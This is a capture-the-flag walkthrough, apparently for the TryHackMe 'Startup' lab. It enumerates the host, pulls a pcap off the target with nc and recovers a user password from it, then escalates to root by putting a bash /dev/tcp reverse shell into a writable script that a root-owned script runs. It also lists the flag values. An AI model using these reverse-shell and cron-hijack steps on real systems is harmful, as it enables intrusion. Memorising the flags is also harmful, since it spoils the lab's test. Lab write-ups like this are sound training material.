> Startup

**export IP=10.10.253.188**

# Nmap

sudo nmap -sC -sV -T4 -Pn -vv -p- -oN nmap/initial $IP

```
21/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12 04:53 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12 04:02 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12 04:53 notice.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.8.107.21
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Maintenance
```

# Gobuster

sudo gobuster -u http://$IP -w /usr/share/wordlists/DirBuster-Lists/directory-list-2.3-medium.txt -t 20 -x php,txt,css,sql,bak,zip,cgi -o gobuster/initial

```
/files
```

Looks the files put in FTP dir are being reverted here. Let's gain a reverse shell using this.

# recipie.txt

```
Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.
```

And in `incidents` folder we ca find `suspicious.pcapng` and let's transfer it to our system using ncat.

nc -l -p 1000 > suspicious.pcapng

nc -w 3 10.8.107.21 1000 < suspicious.pcapng

We get the file an on inspecting it we can get the password of lennie.

`c4ntg3t3n0ughsp1c3`

# user.txt

```
THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
```

In Lennie's home we can find a scripts directoru and a `planner.sh` script which is owned by root.

```
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```

And `print.sh` is owned by lennie.

Let's put a reverse shell `bash -i >& /dev/tcp/<IP>/<port> 0>&1` in there and wait for it!!

# root.txt

```
THM{f963aaa6a430f210222158ae15c3d76d}
```